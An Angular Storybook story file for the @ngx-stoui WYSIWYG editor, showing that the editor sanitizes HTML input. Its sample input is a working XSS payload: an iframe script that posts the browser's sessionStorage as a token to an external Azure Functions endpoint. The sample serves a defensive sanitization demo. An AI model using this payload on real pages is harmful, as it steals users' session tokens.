import { ReactiveFormsModule, UntypedFormControl } from '@angular/forms';
import { MatButtonModule } from '@angular/material/button';
import { MatCardModule } from '@angular/material/card';
import { StoWysiwygModule, WysiwygComponent } from '@ngx-stoui/form';
import type { Meta, StoryObj } from '@storybook/angular';
import { moduleMetadata } from '@storybook/angular';

const meta: Meta<WysiwygComponent> = {
  title: 'form/Wysiwyg',
  component: WysiwygComponent,
  decorators: [
    moduleMetadata({
      imports: [
        StoWysiwygModule,
        ReactiveFormsModule,
        MatCardModule,
        MatButtonModule,
      ],
    }),
  ],
};
export default meta;

const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
</iframe>
<b>This is bold.</b>
`;

export const Usage: StoryObj<WysiwygComponent> = {
  args: {},
  render: (args) => {
    const ctrl = new UntypedFormControl(unsanitized);
    return {
      props: { ...args, ctrl, unsanitized },
      template: `
<sto-wysiwyg [readonly]="readonly" #wysiwyg [formControl]="ctrl"></sto-wysiwyg>
<hr>
<div>
<p>The text we're sending in is</p>
<div style="background-color: lightgray"><code>{{ unsanitized }}</code></div>
<br>
<p>The resulting HTML output is then sanitized </p>
<div style="background-color: lightgray"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>
<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in
(and preferable on your backend service)</p>
</div>
`,
    };
  },
};
